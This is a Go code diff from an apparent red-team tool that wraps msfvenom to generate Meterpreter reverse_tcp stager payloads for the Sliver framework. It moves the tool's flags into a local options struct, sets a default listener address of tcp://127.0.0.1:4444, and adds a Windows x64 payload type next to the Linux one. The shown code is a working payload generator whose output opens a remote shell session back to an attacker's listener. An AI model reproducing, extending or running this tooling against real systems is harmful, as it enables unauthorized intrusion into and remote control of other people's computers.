@@ -6,12 +6,23 @@ import (
 	"net/url"
 	"os/exec"
 
-	c "github.com/Esonhugh/sliver-linux-tcp-stager-helper/cmd/sliverStager/cmd"
+	c "github.com/Esonhugh/sliver-stage-helper/cmd/sliverStager/cmd"
 	"github.com/sirupsen/logrus"
 	"github.com/spf13/cobra"
 )
 
+var Opt = struct {
+	StagerType string
+	Format     string
+	Advanced   string
+	ListenURL  string
+}{}
+
 func init() {
+	StagerOneCmd.Flags().StringVarP(&Opt.StagerType, "stagerType", "t", "linux-x64-tcp", "stager type")
+	StagerOneCmd.Flags().StringVarP(&Opt.Format, "format", "f", "raw", "output format")
+	StagerOneCmd.Flags().StringVarP(&Opt.Advanced, "advanced", "a", "", "advanced options")
+	StagerOneCmd.Flags().StringVarP(&Opt.ListenURL, "listenUrl", "l", "tcp://127.0.0.1:4444", "listener URL")
 	c.RootCmd.AddCommand(StagerOneCmd)
 }
 
@@ -22,13 +33,13 @@ var StagerOneCmd = &cobra.Command{
 	Short: "stagerOne Generates a common stager",
 	Long:  "stagerOne",
 	Run: func(cmd *cobra.Command, args []string) {
-		args, err := ArgCreate(c.Opts.StagerType, c.Opts.ListenerURL, c.Opts.Format)
+		args, err := ArgCreate(Opt.StagerType, Opt.ListenURL, Opt.Format)
 		if err != nil {
 			log.Fatal(err)
 		}
-		if c.Opts.Advanced != "" {
-			log.Debugf("advanced options: %s", c.Opts.Advanced)
-			args = append(args, c.Opts.Advanced)
+		if Opt.Advanced != "" {
+			log.Debugf("advanced options: %s", Opt.Advanced)
+			args = append(args, Opt.Advanced)
 		}
 		p, err := msfvenom(args)
 		if err != nil {
@@ -45,6 +56,10 @@ func ArgCreate(stagerType, listenerURL, format string) ([]string, error) {
 		platform = "linux"
 		arch = "x64"
 		payloadName = "linux/x64/meterpreter/reverse_tcp"
+	case "windows-x64-tcp":
+		platform = "windows"
+		arch = "x64"
+		payloadName = "windows/x64/meterpreter/reverse_tcp"
 	default:
 		return nil, fmt.Errorf("stager type %s not supported", stagerType)
 	}
